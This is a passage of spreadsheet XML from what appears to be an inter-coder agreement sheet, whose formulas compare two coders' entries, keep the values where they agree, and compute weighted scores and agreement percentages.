        <f>IF(AND(Coder1!Y8&amp;""&lt;&gt;"",Coder1!Y8&amp;""=Coder2!Y8&amp;""),Coder1!Y8,"")</f>
        <v/>
      </c>
      <c r="Z8" s="14">
        <f>IF(AND(Coder1!Z8&amp;""&lt;&gt;"",Coder1!Z8&amp;""=Coder2!Z8&amp;""),Coder1!Z8,"")</f>
        <v/>
      </c>
      <c r="AA8" s="14">
        <f>IF(AND(Coder1!AA8&amp;""&lt;&gt;"",Coder1!AA8&amp;""=Coder2!AA8&amp;""),Coder1!AA8,"")</f>
        <v/>
      </c>
      <c r="AB8" s="14">
        <f>IF(AND(Coder1!AB8&amp;""&lt;&gt;"",Coder1!AB8&amp;""=Coder2!AB8&amp;""),Coder1!AB8,"")</f>
        <v/>
      </c>
      <c r="AC8" s="14">
        <f>IF(AND(Coder1!AC8&amp;""&lt;&gt;"",Coder1!AC8&amp;""=Coder2!AC8&amp;""),Coder1!AC8,"")</f>
        <v/>
      </c>
      <c r="AD8" s="14">
        <f>IF(AND(Coder1!AD8&amp;""&lt;&gt;"",Coder1!AD8&amp;""=Coder2!AD8&amp;""),Coder1!AD8,"")</f>
        <v/>
      </c>
      <c r="AE8" s="14">
        <f>IF(AND(Coder1!AE8&amp;""&lt;&gt;"",Coder1!AE8&amp;""=Coder2!AE8&amp;""),Coder1!AE8,"")</f>
        <v/>
      </c>
      <c r="AF8" s="14">
        <f>IF(AND(Coder1!AF8&amp;""&lt;&gt;"",Coder1!AF8&amp;""=Coder2!AF8&amp;""),Coder1!AF8,"")</f>
        <v/>
      </c>
      <c r="AG8" s="14">
        <f>IF(AND(Coder1!AG8&amp;""&lt;&gt;"",Coder1!AG8&amp;""=Coder2!AG8&amp;""),Coder1!AG8,"")</f>
        <v/>
      </c>
      <c r="AH8" s="14">
        <f>IF(AND(Coder1!AH8&amp;""&lt;&gt;"",Coder1!AH8&amp;""=Coder2!AH8&amp;""),Coder1!AH8,"")</f>
        <v/>
      </c>
      <c r="AI8" s="11">
        <f>IF(COUNT(E8:L8)=0,"",SUM(E8:L8))</f>
        <v/>
      </c>
      <c r="AJ8" s="11">
        <f>IF(AI8="","",N(E8)*3+N(F8)*2+N(G8)*2+N(H8)*2+N(I8)*2+N(J8)*3+N(K8)*3+N(L8)*3)</f>
        <v/>
      </c>
      <c r="AK8" s="11">
        <f>IF(AI8="","",COUNTIF(N8:AG8,1))</f>
        <v/>
      </c>
      <c r="AL8" s="11">
        <f>IF(OR(AJ8="",AJ8=0),"",ROUND(100*(AJ8-AK8)/AJ8,1))</f>
        <v/>
      </c>
      <c r="AM8" s="11">
        <f>IF(AND(Coder1!AN8=1,Coder2!AN8=1),IF(COUNTBLANK(E8:AH8)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN8" s="11">
        <f>IF(AND(Coder1!AN8=1,Coder2!AN8=1),IF(SUMPRODUCT(--(Coder1!E8:AH8&amp;""&lt;&gt;Coder2!E8:AH8&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO8" s="11" t="n"/>
    </row>
    <row r="9">
      <c r="A9" s="11">
        <f>Coder1!A9</f>
        <v/>
      </c>
      <c r="B9" s="11">
        <f>Coder1!B9</f>
        <v/>
      </c>
      <c r="C9" s="11">
        <f>Coder1!C9</f>
        <v/>
      </c>
      <c r="D9" s="11">
        <f>Coder1!D9</f>
        <v/>
      </c>
      <c r="E9" s="14">
        <f>IF(AND(Coder1!E9&amp;""&lt;&gt;"",Coder1!E9&amp;""=Coder2!E9&amp;""),Coder1!E9,"")</f>
        <v/>
      </c>
      <c r="F9" s="14">
        <f>IF(AND(Coder1!F9&amp;""&lt;&gt;"",Coder1!F9&amp;""=Coder2!F9&amp;""),Coder1!F9,"")</f>
        <v/>
      </c>
      <c r="G9" s="14">
        <f>IF(AND(Coder1!G9&amp;""&lt;&gt;"",Coder1!G9&amp;""=Coder2!G9&amp;""),Coder1!G9,"")</f>
        <v/>
      </c>
      <c r="H9" s="14">
        <f>IF(AND(Coder1!H9&amp;""&lt;&gt;"",Coder1!H9&amp;""=Coder2!H9&amp;""),Coder1!H9,"")</f>
        <v/>
      </c>
      <c r="I9" s="14">
        <f>IF(AND(Coder1!I9&amp;""&lt;&gt;"",Coder1!I9&amp;""=Coder2!I9&amp;""),Coder1!I9,"")</f>
        <v/>
      </c>
      <c r="J9" s="14">
        <f>IF(AND(Coder1!J9&amp;""&lt;&gt;"",Coder1!J9&amp;""=Coder2!J9&amp;""),Coder1!J9,"")</f>
        <v/>
      </c>
      <c r="K9" s="14">
        <f>IF(AND(Coder1!K9&amp;""&lt;&gt;"",Coder1!K9&amp;""=Coder2!K9&amp;""),Coder1!K9,"")</f>
        <v/>
      </c>
      <c r="L9" s="14">
        <f>IF(AND(Coder1!L9&amp;""&lt;&gt;"",Coder1!L9&amp;""=Coder2!L9&amp;""),Coder1!L9,"")</f>
        <v/>
      </c>
      <c r="M9" s="14">
        <f>IF(AND(Coder1!M9&amp;""&lt;&gt;"",Coder1!M9&amp;""=Coder2!M9&amp;""),Coder1!M9,"")</f>
        <v/>
      </c>
      <c r="N9" s="14">
        <f>IF(AND(Coder1!N9&amp;""&lt;&gt;"",Coder1!N9&amp;""=Coder2!N9&amp;""),Coder1!N9,"")</f>
        <v/>
      </c>
      <c r="O9" s="14">
        <f>IF(AND(Coder1!O9&amp;""&lt;&gt;"",Coder1!O9&amp;""=Coder2!O9&amp;""),Coder1!O9,"")</f>
        <v/>
      </c>
      <c r="P9" s="14">
        <f>IF(AND(Coder1!P9&amp;""&lt;&gt;"",Coder1!P9&amp;""=Coder2!P9&amp;""),Coder1!P9,"")</f>
        <v/>
      </c>
      <c r="Q9" s="14">
        <f>IF(AND(Coder1!Q9&amp;""&lt;&gt;"",Coder1!Q9&amp;""=Coder2!Q9&amp;""),Coder1!Q9,"")</f>
        <v/>
      </c>
      <c r="R9" s="14">
        <f>IF(AND(Coder1!R9&amp;""&lt;&gt;"",Coder1!R9&amp;""=Coder2!R9&amp;""),Coder1!R9,"")</f>
        <v/>
      </c>
      <c r="S9" s="14">
        <f>IF(AND(Coder1!S9&amp;""&lt;&gt;"",Coder1!S9&amp;""=Coder2!S9&amp;""),Coder1!S9,"")</f>
        <v/>
      </c>
      <c r="T9" s="14">
        <f>IF(AND(Coder1!T9&amp;""&lt;&gt;"",Coder1!T9&amp;""=Coder2!T9&amp;""),Coder1!T9,"")</f>
        <v/>
      </c>
      <c r="U9" s="14">
        <f>IF(AND(Coder1!U9&amp;""&lt;&gt;"",Coder1!U9&amp;""=Coder2!U9&amp;""),Coder1!U9,"")</f>
        <v/>
      </c>
      <c r="V9" s="14">
        <f>IF(AND(Coder1!V9&amp;""&lt;&gt;"",Coder1!V9&amp;""=Coder2!V9&amp;""),Coder1!V9,"")</f>
        <v/>
      </c>
      <c r="W9" s="14">
        <f>IF(AND(Coder1!W9&amp;""&lt;&gt;"",Coder1!W9&amp;""=Coder2!W9&amp;""),Coder1!W9,"")</f>
        <v/>
      </c>
      <c r="X9" s="14">
        <f>IF(AND(Coder1!X9&amp;""&lt;&gt;"",Coder1!X9&amp;""=Coder2!X9&amp;""),Coder1!X9,"")</f>
        <v/>
      </c>
      <c r="Y9" s="14">
        <f>IF(AND(Coder1!Y9&amp;""&lt;&gt;"",Coder1!Y9&amp;""=Coder2!Y9&amp;""),Coder1!Y9,"")</f>
        <v/>
      </c>
      <c r="Z9" s="14">
        <f>IF(AND(Coder1!Z9&amp;""&lt;&gt;"",Coder1!Z9&amp;""=Coder2!Z9&amp;""),Coder1!Z9,"")</f>
        <v/>
      </c>
      <c r="AA9" s="14">
        <f>IF(AND(Coder1!AA9&amp;""&lt;&gt;"",Coder1!AA9&amp;""=Coder2!AA9&amp;""),Coder1!AA9,"")</f>
        <v/>
      </c>
      <c r="AB9" s="14">
        <f>IF(AND(Coder1!AB9&amp;""&lt;&gt;"",Coder1!AB9&amp;""=Coder2!AB9&amp;""),Coder1!AB9,"")</f>
        <v/>
      </c>
      <c r="AC9" s="14">
        <f>IF(AND(Coder1!AC9&amp;""&lt;&gt;"",Coder1!AC9&amp;""=Coder2!AC9&amp;""),Coder1!AC9,"")</f>
        <v/>
      </c>
      <c r="AD9" s="14">
        <f>IF(AND(Coder1!AD9&amp;""&lt;&gt;"",Coder1!AD9&amp;""=Coder2!AD9&amp;""),Coder1!AD9,"")</f>
        <v/>
      </c>
      <c r="AE9" s="14">
        <f>IF(AND(Coder1!AE9&amp;""&lt;&gt;"",Coder1!AE9&amp;""=Coder2!AE9&amp;""),Coder1!AE9,"")</f>
        <v/>
      </c>
      <c r="AF9" s="14">
        <f>IF(AND(Coder1!AF9&amp;""&lt;&gt;"",Coder1!AF9&amp;""=Coder2!AF9&amp;""),Coder1!AF9,"")</f>
        <v/>
      </c>
      <c r="AG9" s="14">
        <f>IF(AND(Coder1!AG9&amp;""&lt;&gt;"",Coder1!AG9&amp;""=Coder2!AG9&amp;""),Coder1!AG9,"")</f>
        <v/>
      </c>
      <c r="AH9" s="14">
        <f>IF(AND(Coder1!AH9&amp;""&lt;&gt;"",Coder1!AH9&amp;""=Coder2!AH9&amp;""),Coder1!AH9,"")</f>
        <v/>
      </c>
      <c r="AI9" s="11">
        <f>IF(COUNT(E9:L9)=0,"",SUM(E9:L9))</f>
        <v/>
      </c>
      <c r="AJ9" s="11">
        <f>IF(AI9="","",N(E9)*3+N(F9)*2+N(G9)*2+N(H9)*2+N(I9)*2+N(J9)*3+N(K9)*3+N(L9)*3)</f>
        <v/>
      </c>
      <c r="AK9" s="11">
        <f>IF(AI9="","",COUNTIF(N9:AG9,1))</f>
        <v/>
      </c>
      <c r="AL9" s="11">
        <f>IF(OR(AJ9="",AJ9=0),"",ROUND(100*(AJ9-AK9)/AJ9,1))</f>
        <v/>
      </c>
      <c r="AM9" s="11">
        <f>IF(AND(Coder1!AN9=1,Coder2!AN9=1),IF(COUNTBLANK(E9:AH9)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN9" s="11">
        <f>IF(AND(Coder1!AN9=1,Coder2!AN9=1),IF(SUMPRODUCT(--(Coder1!E9:AH9&amp;""&lt;&gt;Coder2!E9:AH9&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO9" s="11" t="n"/>
    </row>
    <row r="10">
      <c r="A10" s="11">
        <f>Coder1!A10</f>
        <v/>
      </c>
      <c r="B10" s="11">
        <f>Coder1!B10</f>
        <v/>
      </c>
      <c r="C10" s="11">
        <f>Coder1!C10</f>
        <v/>
      </c>
      <c r="D10" s="11">
        <f>Coder1!D10</f>
        <v/>
      </c>
      <c r="E10" s="14">
        <f>IF(AND(Coder1!E10&amp;""&lt;&gt;"",Coder1!E10&amp;""=Coder2!E10&amp;""),Coder1!E10,"")</f>
        <v/>
      </c>
      <c r="F10" s="14">
        <f>IF(AND(Coder1!F10&amp;""&lt;&gt;"",Coder1!F10&amp;""=Coder2!F10&amp;""),Coder1!F10,"")</f>
        <v/>
      </c>
      <c r="G10" s="14">
        <f>IF(AND(Coder1!G10&amp;""&lt;&gt;"",Coder1!G10&amp;""=Coder2!G10&amp;""),Coder1!G10,"")</f>
        <v/>
      </c>
      <c r="H10" s="14">
        <f>IF(AND(Coder1!H10&amp;""&lt;&gt;"",Coder1!H10&amp;""=Coder2!H10&amp;""),Coder1!H10,"")</f>
        <v/>
      </c>
      <c r="I10" s="14">
        <f>IF(AND(Coder1!I10&amp;""&lt;&gt;"",Coder1!I10&amp;""=Coder2!I10&amp;""),Coder1!I10,"")</f>
        <v/>
      </c>
      <c r="J10" s="14">
        <f>IF(AND(Coder1!J10&amp;""&lt;&gt;"",Coder1!J10&amp;""=Coder2!J10&amp;""),Coder1!J10,"")</f>
        <v/>
      </c>
      <c r="K10" s="14">
        <f>IF(AND(Coder1!K10&amp;""&lt;&gt;"",Coder1!K10&amp;""=Coder2!K10&amp;""),Coder1!K10,"")</f>
        <v/>
      </c>
      <c r="L10" s="14">
        <f>IF(AND(Coder1!L10&amp;""&lt;&gt;"",Coder1!L10&amp;""=Coder2!L10&amp;""),Coder1!L10,"")</f>
        <v/>
      </c>
      <c r="M10" s="14">
        <f>IF(AND(Coder1!M10&amp;""&lt;&gt;"",Coder1!M10&amp;""=Coder2!M10&amp;""),Coder1!M10,"")</f>
        <v/>
      </c>
      <c r="N10" s="14">
        <f>IF(AND(Coder1!N10&amp;""&lt;&gt;"",Coder1!N10&amp;""=Coder2!N10&amp;""),Coder1!N10,"")</f>
        <v/>
      </c>
      <c r="O10" s="14">
        <f>IF(AND(Coder1!O10&amp;""&lt;&gt;"",Coder1!O10&amp;""=Coder2!O10&amp;""),Coder1!O10,"")</f>
        <v/>
      </c>
      <c r="P10" s="14">
        <f>IF(AND(Coder1!P10&amp;""&lt;&gt;"",Coder1!P10&amp;""=Coder2!P10&amp;""),Coder1!P10,"")</f>
        <v/>
      </c>
      <c r="Q10" s="14">
        <f>IF(AND(Coder1!Q10&amp;""&lt;&gt;"",Coder1!Q10&amp;""=Coder2!Q10&amp;""),Coder1!Q10,"")</f>
        <v/>
      </c>
      <c r="R10" s="14">
        <f>IF(AND(Coder1!R10&amp;""&lt;&gt;"",Coder1!R10&amp;""=Coder2!R10&amp;""),Coder1!R10,"")</f>
        <v/>
      </c>
      <c r="S10" s="14">
        <f>IF(AND(Coder1!S10&amp;""&lt;&gt;"",Coder1!S10&amp;""=Coder2!S10&amp;""),Coder1!S10,"")</f>
        <v/>
      </c>
      <c r="T10" s="14">
        <f>IF(AND(Coder1!T10&amp;""&lt;&gt;"",Coder1!T10&amp;""=Coder2!T10&amp;""),Coder1!T10,"")</f>
        <v/>
      </c>
      <c r="U10" s="14">
        <f>IF(AND(Coder1!U10&amp;""&lt;&gt;"",Coder1!U10&amp;""=Coder2!U10&amp;""),Coder1!U10,"")</f>
        <v/>
      </c>
      <c r="V10" s="14">
        <f>IF(AND(Coder1!V10&amp;""&lt;&gt;"",Coder1!V10&amp;""=Coder2!V10&amp;""),Coder1!V10,"")</f>
        <v/>
      </c>
      <c r="W10" s="14">
        <f>IF(AND(Coder1!W10&amp;""&lt;&gt;"",Coder1!W10&amp;""=Coder2!W10&amp;""),Coder1!W10,"")</f>
        <v/>
      </c>
      <c r="X10" s="14">
        <f>IF(AND(Coder1!X10&amp;""&lt;&gt;"",Coder1!X10&amp;""=Coder2!X10&amp;""),Coder1!X10,"")</f>
        <v/>
      </c>
      <c r="Y10" s="14">
        <f>IF(AND(Coder1!Y10&amp;""&lt;&gt;"",Coder1!Y10&amp;""=Coder2!Y10&amp;""),Coder1!Y10,"")</f>
        <v/>
      </c>
      <c r="Z10" s="14">
        <f>IF(AND(Coder1!Z10&amp;""&lt;&gt;"",Coder1!Z10&amp;""=Coder2!Z10&amp;""),Coder1!Z10,"")</f>
        <v/>
      </c>
      <c r="AA10" s="14">
        <f>IF(AND(Coder1!AA10&amp;""&lt;&gt;"",Coder1!AA10&amp;""=Coder2!AA10&amp;""),Coder1!AA10,"")</f>
        <v/>
      </c>
      <c r="AB10" s="14">
        <f>IF(AND(Coder1!AB10&amp;""&lt;&gt;"",Coder1!AB10&amp;""=Coder2!AB10&amp;""),Coder1!AB10,"")</f>
        <v/>
      </c>
      <c r="AC10" s="14">
        <f>IF(AND(Coder1!AC10&amp;""&lt;&gt;"",Coder1!AC10&amp;""=Coder2!AC10&amp;""),Coder1!AC10,"")</f>
        <v/>
      </c>
      <c r="AD10" s="14">
        <f>IF(AND(Coder1!AD10&amp;""&lt;&gt;"",Coder1!AD10&amp;""=Coder2!AD10&amp;""),Coder1!AD10,"")</f>
        <v/>
      </c>
      <c r="AE10" s="14">
        <f>IF(AND(Coder1!AE10&amp;""&lt;&gt;"",Coder1!AE10&amp;""=Coder2!AE10&amp;""),Coder1!AE10,"")</f>
        <v/>
      </c>
      <c r="AF10" s="14">
        <f>IF(AND(Coder1!AF10&amp;""&lt;&gt;"",Coder1!AF10&amp;""=Coder2!AF10&amp;""),Coder1!AF10,"")</f>
        <v/>
      </c>
      <c r="AG10" s="14">
        <f>IF(AND(Coder1!AG10&amp;""&lt;&gt;"",Coder1!AG10&amp;""=Coder2!AG10&amp;""),Coder1!AG10,"")</f>
        <v/>
      </c>
      <c r="AH10" s="14">
        <f>IF(AND(Coder1!AH10&amp;""&lt;&gt;"",Coder1!AH10&amp;""=Coder2!AH10&amp;""),Coder1!AH10,"")</f>
        <v/>
      </c>
      <c r="AI10" s="11">
        <f>IF(COUNT(E10:L10)=0,"",SUM(E10:L10))</f>
        <v/>
      </c>
      <c r="AJ10" s="11">
        <f>IF(AI10="","",N(E10)*3+N(F10)*2+N(G10)*2+N(H10)*2+N(I10)*2+N(J10)*3+N(K10)*3+N(L10)*3)</f>
        <v/>
      </c>
      <c r="AK10" s="11">
        <f>IF(AI10="","",COUNTIF(N10:AG10,1))</f>
        <v/>
      </c>
      <c r="AL10" s="11">
        <f>IF(OR(AJ10="",AJ10=0),"",ROUND(100*(AJ10-AK10)/AJ10,1))</f>
        <v/>
      </c>
      <c r="AM10" s="11">
        <f>IF(AND(Coder1!AN10=1,Coder2!AN10=1),IF(COUNTBLANK(E10:AH10)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN10" s="11">
        <f>IF(AND(Coder1!AN10=1,Coder2!AN10=1),IF(SUMPRODUCT(--(Coder1!E10:AH10&amp;""&lt;&gt;Coder2!E10:AH10&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO10" s="11" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="11">
        <f>Coder1!A11</f>
        <v/>
      </c>
      <c r="B11" s="11">
        <f>Coder1!B11</f>
        <v/>
      </c>
      <c r="C11" s="11">
        <f>Coder1!C11</f>
        <v/>
      </c>
      <c r="D11" s="11">
        <f>Coder1!D11</f>
        <v/>
      </c>
      <c r="E11" s="14">
        <f>IF(AND(Coder1!E11&amp;""&lt;&gt;"",Coder1!E11&amp;""=Coder2!E11&amp;""),Coder1!E11,"")</f>
        <v/>
      </c>
      <c r="F11" s="14">
        <f>IF(AND(Coder1!F11&amp;""&lt;&gt;"",Coder1!F11&amp;""=Coder2!F11&amp;""),Coder1!F11,"")</f>
        <v/>
      </c>
      <c r="G11" s="14">
        <f>IF(AND(Coder1!G11&amp;""&lt;&gt;"",Coder1!G11&amp;""=Coder2!G11&amp;""),Coder1!G11,"")</f>
        <v/>
      </c>
      <c r="H11" s="14">
        <f>IF(AND(Coder1!H11&amp;""&lt;&gt;"",Coder1!H11&amp;""=Coder2!H11&amp;""),Coder1!H11,"")</f>
        <v/>
      </c>
      <c r="I11" s="14">
        <f>IF(AND(Coder1!I11&amp;""&lt;&gt;"",Coder1!I11&amp;""=Coder2!I11&amp;""),Coder1!I11,"")</f>
        <v/>
      </c>
      <c r="J11" s="14">
        <f>IF(AND(Coder1!J11&amp;""&lt;&gt;"",Coder1!J11&amp;""=Coder2!J11&amp;""),Coder1!J11,"")</f>
        <v/>
      </c>
      <c r="K11" s="14">
        <f>IF(AND(Coder1!K11&amp;""&lt;&gt;"",Coder1!K11&amp;""=Coder2!K11&amp;""),Coder1!K11,"")</f>
        <v/>
      </c>
      <c r="L11" s="14">
        <f>IF(AND(Coder1!L11&amp;""&lt;&gt;"",Coder1!L11&amp;""=Coder2!L11&amp;""),Coder1!L11,"")</f>
        <v/>
      </c>
      <c r="M11" s="14">
        <f>IF(AND(Coder1!M11&amp;""&lt;&gt;"",Coder1!M11&amp;""=Coder2!M11&amp;""),Coder1!M11,"")</f>
        <v/>
      </c>
      <c r="N11" s="14">
        <f>IF(AND(Coder1!N11&amp;""&lt;&gt;"",Coder1!N11&amp;""=Coder2!N11&amp;""),Coder1!N11,"")</f>
        <v/>
      </c>
      <c r="O11" s="14">
        <f>IF(AND(Coder1!O11&amp;""&lt;&gt;"",Coder1!O11&amp;""=Coder2!O11&amp;""),Coder1!O11,"")</f>
        <v/>
      </c>
      <c r="P11" s="14">
        <f>IF(AND(Coder1!P11&amp;""&lt;&gt;"",Coder1!P11&amp;""=Coder2!P11&amp;""),Coder1!P11,"")</f>
        <v/>
      </c>
      <c r="Q11" s="14">
        <f>IF(AND(Coder1!Q11&amp;""&lt;&gt;"",Coder1!Q11&amp;""=Coder2!Q11&amp;""),Coder1!Q11,"")</f>
        <v/>
      </c>
      <c r="R11" s="14">
        <f>IF(AND(Coder1!R11&amp;""&lt;&gt;"",Coder1!R11&amp;""=Coder2!R11&amp;""),Coder1!R11,"")</f>
        <v/>
      </c>
      <c r="S11" s="14">
        <f>IF(AND(Coder1!S11&amp;""&lt;&gt;"",Coder1!S11&amp;""=Coder2!S11&amp;""),Coder1!S11,"")</f>
        <v/>
      </c>
      <c r="T11" s="14">
        <f>IF(AND(Coder1!T11&amp;""&lt;&gt;"",Coder1!T11&amp;""=Coder2!T11&amp;""),Coder1!T11,"")</f>
        <v/>
      </c>
      <c r="U11" s="14">
        <f>IF(AND(Coder1!U11&amp;""&lt;&gt;"",Coder1!U11&amp;""=Coder2!U11&amp;""),Coder1!U11,"")</f>
        <v/>
      </c>
      <c r="V11" s="14">
        <f>IF(AND(Coder1!V11&amp;""&lt;&gt;"",Coder1!V11&amp;""=Coder2!V11&amp;""),Coder1!V11,"")</f>
        <v/>
      </c>
      <c r="W11" s="14">
        <f>IF(AND(Coder1!W11&amp;""&lt;&gt;"",Coder1!W11&amp;""=Coder2!W11&amp;""),Coder1!W11,"")</f>
        <v/>
      </c>
      <c r="X11" s="14">
        <f>IF(AND(Coder1!X11&amp;""&lt;&gt;"",Coder1!X11&amp;""=Coder2!X11&amp;""),Coder1!X11,"")</f>
        <v/>
      </c>
      <c r="Y11" s="14">
        <f>IF(AND(Coder1!Y11&amp;""&lt;&gt;"",Coder1!Y11&amp;""=Coder2!Y11&amp;""),Coder1!Y11,"")</f>
        <v/>
      </c>
      <c r="Z11" s="14">
        <f>IF(AND(Coder1!Z11&amp;""&lt;&gt;"",Coder1!Z11&amp;""=Coder2!Z11&amp;""),Coder1!Z11,"")</f>
        <v/>
      </c>
      <c r="AA11" s="14">
        <f>IF(AND(Coder1!AA11&amp;""&lt;&gt;"",Coder1!AA11&amp;""=Coder2!AA11&amp;""),Coder1!AA11,"")</f>
        <v/>
      </c>
      <c r="AB11" s="14">
        <f>IF(AND(Coder1!AB11&amp;""&lt;&gt;"",Coder1!AB11&amp;""=Coder2!AB11&amp;""),Coder1!AB11,"")</f>
        <v/>
      </c>
      <c r="AC11" s="14">
        <f>IF(AND(Coder1!AC11&amp;""&lt;&gt;"",Coder1!AC11&amp;""=Coder2!AC11&amp;""),Coder1!AC11,"")</f>
        <v/>
      </c>
      <c r="AD11" s="14">
        <f>IF(AND(Coder1!AD11&amp;""&lt;&gt;"",Coder1!AD11&amp;""=Coder2!AD11&amp;""),Coder1!AD11,"")</f>
        <v/>
      </c>
      <c r="AE11" s="14">
        <f>IF(AND(Coder1!AE11&amp;""&lt;&gt;"",Coder1!AE11&amp;""=Coder2!AE11&amp;""),Coder1!AE11,"")</f>
        <v/>
      </c>
      <c r="AF11" s="14">
        <f>IF(AND(Coder1!AF11&amp;""&lt;&gt;"",Coder1!AF11&amp;""=Coder2!AF11&amp;""),Coder1!AF11,"")</f>
        <v/>
      </c>
      <c r="AG11" s="14">
        <f>IF(AND(Coder1!AG11&amp;""&lt;&gt;"",Coder1!AG11&amp;""=Coder2!AG11&amp;""),Coder1!AG11,"")</f>
        <v/>
      </c>
      <c r="AH11" s="14">
        <f>IF(AND(Coder1!AH11&amp;""&lt;&gt;"",Coder1!AH11&amp;""=Coder2!AH11&amp;""),Coder1!AH11,"")</f>
        <v/>
      </c>
      <c r="AI11" s="11">
        <f>IF(COUNT(E11:L11)=0,"",SUM(E11:L11))</f>
        <v/>
      </c>
      <c r="AJ11" s="11">
        <f>IF(AI11="","",N(E11)*3+N(F11)*2+N(G11)*2+N(H11)*2+N(I11)*2+N(J11)*3+N(K11)*3+N(L11)*3)</f>
        <v/>
      </c>
      <c r="AK11" s="11">
        <f>IF(AI11="","",COUNTIF(N11:AG11,1))</f>
        <v/>
      </c>
      <c r="AL11" s="11">
        <f>IF(OR(AJ11="",AJ11=0),"",ROUND(100*(AJ11-AK11)/AJ11,1))</f>
        <v/>
      </c>
      <c r="AM11" s="11">
        <f>IF(AND(Coder1!AN11=1,Coder2!AN11=1),IF(COUNTBLANK(E11:AH11)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN11" s="11">
        <f>IF(AND(Coder1!AN11=1,Coder2!AN11=1),IF(SUMPRODUCT(--(Coder1!E11:AH11&amp;""&lt;&gt;Coder2!E11:AH11&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO11" s="11" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="11">
        <f>Coder1!A12</f>
        <v/>
      </c>
      <c r="B12" s="11">
        <f>Coder1!B12</f>
        <v/>
      </c>
      <c r="C12" s="11">
        <f>Coder1!C12</f>
        <v/>
      </c>
      <c r="D12" s="11">
        <f>Coder1!D12</f>
        <v/>
      </c>
      <c r="E12" s="14">
        <f>IF(AND(Coder1!E12&amp;""&lt;&gt;"",Coder1!E12&amp;""=Coder2!E12&amp;""),Coder1!E12,"")</f>
        <v/>
      </c>
      <c r="F12" s="14">
        <f>IF(AND(Coder1!F12&amp;""&lt;&gt;"",Coder1!F12&amp;""=Coder2!F12&amp;""),Coder1!F12,"")</f>
        <v/>
      </c>
      <c r="G12" s="14">
        <f>IF(AND(Coder1!G12&amp;""&lt;&gt;"",Coder1!G12&amp;""=Coder2!G12&amp;""),Coder1!G12,"")</f>
        <v/>
      </c>
      <c r="H12" s="14">
        <f>IF(AND(Coder1!H12&amp;""&lt;&gt;"",Coder1!H12&amp;""=Coder2!H12&amp;""),Coder1!H12,"")</f>
        <v/>
      </c>
      <c r="I12" s="14">
        <f>IF(AND(Coder1!I12&amp;""&lt;&gt;"",Coder1!I12&amp;""=Coder2!I12&amp;""),Coder1!I12,"")</f>
        <v/>
      </c>
      <c r="J12" s="14">
        <f>IF(AND(Coder1!J12&amp;""&lt;&gt;"",Coder1!J12&amp;""=Coder2!J12&amp;""),Coder1!J12,"")</f>
        <v/>
      </c>
      <c r="K12" s="14">
        <f>IF(AND(Coder1!K12&amp;""&lt;&gt;"",Coder1!K12&amp;""=Coder2!K12&amp;""),Coder1!K12,"")</f>
        <v/>
      </c>
      <c r="L12" s="14">
        <f>IF(AND(Coder1!L12&amp;""&lt;&gt;"",Coder1!L12&amp;""=Coder2!L12&amp;""),Coder1!L12,"")</f>
        <v/>
      </c>
      <c r="M12" s="14">
        <f>IF(AND(Coder1!M12&amp;""&lt;&gt;"",Coder1!M12&amp;""=Coder2!M12&amp;""),Coder1!M12,"")</f>
        <v/>
      </c>
      <c r="N12" s="14">
        <f>IF(AND(Coder1!N12&amp;""&lt;&gt;"",Coder1!N12&amp;""=Coder2!N12&amp;""),Coder1!N12,"")</f>
        <v/>
      </c>
      <c r="O12" s="14">
        <f>IF(AND(Coder1!O12&amp;""&lt;&gt;"",Coder1!O12&amp;""=Coder2!O12&amp;""),Coder1!O12,"")</f>
        <v/>
      </c>
      <c r="P12" s="14">
        <f>IF(AND(Coder1!P12&amp;""&lt;&gt;"",Coder1!P12&amp;""=Coder2!P12&amp;""),Coder1!P12,"")</f>
        <v/>
      </c>
      <c r="Q12" s="14">
        <f>IF(AND(Coder1!Q12&amp;""&lt;&gt;"",Coder1!Q12&amp;""=Coder2!Q12&amp;""),Coder1!Q12,"")</f>
        <v/>
      </c>
      <c r="R12" s="14">
        <f>IF(AND(Coder1!R12&amp;""&lt;&gt;"",Coder1!R12&amp;""=Coder2!R12&amp;""),Coder1!R12,"")</f>
        <v/>
      </c>
      <c r="S12" s="14">
        <f>IF(AND(Coder1!S12&amp;""&lt;&gt;"",Coder1!S12&amp;""=Coder2!S12&amp;""),Coder1!S12,"")</f>
        <v/>
      </c>
      <c r="T12" s="14">
        <f>IF(AND(Coder1!T12&amp;""&lt;&gt;"",Coder1!T12&amp;""=Coder2!T12&amp;""),Coder1!T12,"")</f>
        <v/>
      </c>
      <c r="U12" s="14">
        <f>IF(AND(Coder1!U12&amp;""&lt;&gt;"",Coder1!U12&amp;""=Coder2!U12&amp;""),Coder1!U12,"")</f>
        <v/>
      </c>
      <c r="V12" s="14">
        <f>IF(AND(Coder1!V12&amp;""&lt;&gt;"",Coder1!V12&amp;""=Coder2!V12&amp;""),Coder1!V12,"")</f>
        <v/>
      </c>
      <c r="W12" s="14">
        <f>IF(AND(Coder1!W12&amp;""&lt;&gt;"",Coder1!W12&amp;""=Coder2!W12&amp;""),Coder1!W12,"")</f>
        <v/>
      </c>
      <c r="X12" s="14">
        <f>IF(AND(Coder1!X12&amp;""&lt;&gt;"",Coder1!X12&amp;""=Coder2!X12&amp;""),Coder1!X12,"")</f>
        <v/>
      </c>
      <c r="Y12" s="14">
        <f>IF(AND(Coder1!Y12&amp;""&lt;&gt;"",Coder1!Y12&amp;""=Coder2!Y12&amp;""),Coder1!Y12,"")</f>
        <v/>
      </c>
      <c r="Z12" s="14">
        <f>IF(AND(Coder1!Z12&amp;""&lt;&gt;"",Coder1!Z12&amp;""=Coder2!Z12&amp;""),Coder1!Z12,"")</f>
        <v/>
      </c>
      <c r="AA12" s="14">
        <f>IF(AND(Coder1!AA12&amp;""&lt;&gt;"",Coder1!AA12&amp;""=Coder2!AA12&amp;""),Coder1!AA12,"")</f>
        <v/>
      </c>
      <c r="AB12" s="14">
